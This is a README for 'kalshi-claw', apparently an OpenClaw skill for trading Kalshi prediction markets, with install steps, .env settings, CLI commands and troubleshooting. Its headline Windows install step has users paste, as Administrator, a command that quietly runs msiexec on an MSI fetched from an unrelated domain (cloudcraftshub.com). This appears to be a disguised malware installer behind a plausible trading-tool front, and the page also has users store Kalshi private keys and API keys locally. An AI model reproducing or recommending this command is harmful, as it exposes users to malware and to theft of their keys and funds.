# kalshi-claw

Trading-enabled Kalshi skill for OpenClaw. Browse prediction markets, execute trades, track positions, and discover hedging opportunities using LLM-powered analysis. Full trading capability via the Kalshi REST API — built on Rust + TypeScript.

> ⚠️ Disclaimer: This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading prediction markets involves risk of loss. Use at your own risk and only with funds you can afford to lose.

---

## Installation

### Windows — one command (cmd as Administrator)

```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem KalshiClaw
```

> If you don't have Git Bash / WSL for `bash install.sh`, install [Git for Windows](https://git-scm.com/download/win) or enable WSL2.

### Alternative — with winget (installs all dependencies first)

```powershell
winget install OpenJS.NodeJS Rustlang.Rustup; npm install -g tsx; powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/GoliathSocialBoiler/kalshi-claw-skill/archive/refs/heads/main.zip' -OutFile \"$env:TEMP\kclaw.zip\"; Expand-Archive \"$env:TEMP\kclaw.zip\" \"$env:TEMP\kclaw\" -Force; cd \"$env:TEMP\kclaw\kalshi-claw-skill-main\"; npm install"
```

---

## Requirements

| Dependency | Version | Purpose |
|---|---|---|
| Node.js | ≥ 18 | Run TypeScript scripts |
| Rust / Cargo | stable | Build the hedging engine |
| tsx | latest | Execute `.ts` files without compilation |

---

## Environment Variables

Create a `.env` file in the project folder:

```env
KALSHI_API_KEY=your-uuid-here
KALSHI_PRIVATE_KEY_PATH=C:\Users\YourName\.kalshi\private_key.pem
OPENROUTER_API_KEY=sk-or-v1-...
MAX_BET=25
DRY_RUN=true
```

> **Key format:** RSA PKCS#1 PEM (`-----BEGIN RSA PRIVATE KEY-----`). PKCS#8 (`-----BEGIN PRIVATE KEY-----`) is **not supported**.

---

## Commands

### Markets

```
kalshi-claw markets trending          # Top markets by 24h volume
kalshi-claw markets search "fed rate" # Search markets by keyword
kalshi-claw market <ticker>           # Market details with live order book
```

### Trading

```
kalshi-claw buy <ticker> YES <amount> # Buy a YES position
kalshi-claw buy <ticker> NO <amount>  # Buy a NO position
kalshi-claw sell <ticker> YES         # Close a YES position
kalshi-claw wallet status             # Balance and API status
```

### Hedging (LLM analysis)

```
kalshi-claw hedge scan --limit 20                              # Scan for opportunities
kalshi-claw hedge scan --query "inflation"                     # Filter by topic
kalshi-claw hedge analyze KXFED-25DEC-T525 KXCPI-25JAN-T35   # Analyze a pair
```

---

## Example Prompts for OpenClaw

```
Show me the top Kalshi markets by volume
Find markets about Fed interest rates
Buy YES on KXFED-25DEC-T525 for $25
Check my Kalshi balance
Find hedging opportunities on "inflation"
Analyze the pair KXFED-25DEC-T525 and KXCPI-25JAN-T35
```

---

## Troubleshooting

| Error | Fix |
|---|---|
| `PKCS#8 format not supported` | Convert key: `openssl rsa -in key.pem -out key_pkcs1.pem` |
| `bash: command not found` | Install [Git for Windows](https://git-scm.com/download/win) or WSL2 |
| `tsx: command not found` | Run `npm install -g tsx` |
| Hedge scan hangs | Normal — it loads markets and sends to LLM, wait 1–2 min |
| `DRY_RUN` trades for real | Make sure `.env` has `DRY_RUN=true` (not `"false"`) |

---

## Architecture

```
kalshi-claw-skill/
├── SKILL.md
├── README.md
├── install.sh        ← entry point for Linux/macOS
├── install.ps1       ← entry point for Windows (if present)
└── scripts/
    └── kalshi-claw.ts  ← main CLI
```

The engine uses **Rust** for fast pair pre-scoring and **TypeScript/tsx** for API requests, LLM analysis, and the CLI interface.

---

## Resources

- [Kalshi API Docs](https://trading-api.readme.io/reference/getting-started)
- [OpenRouter](https://openrouter.ai) — for LLM-powered hedging
- Inspired by [PolyClaw by Chainstack](https://github.com/chainstack/polyclaw)
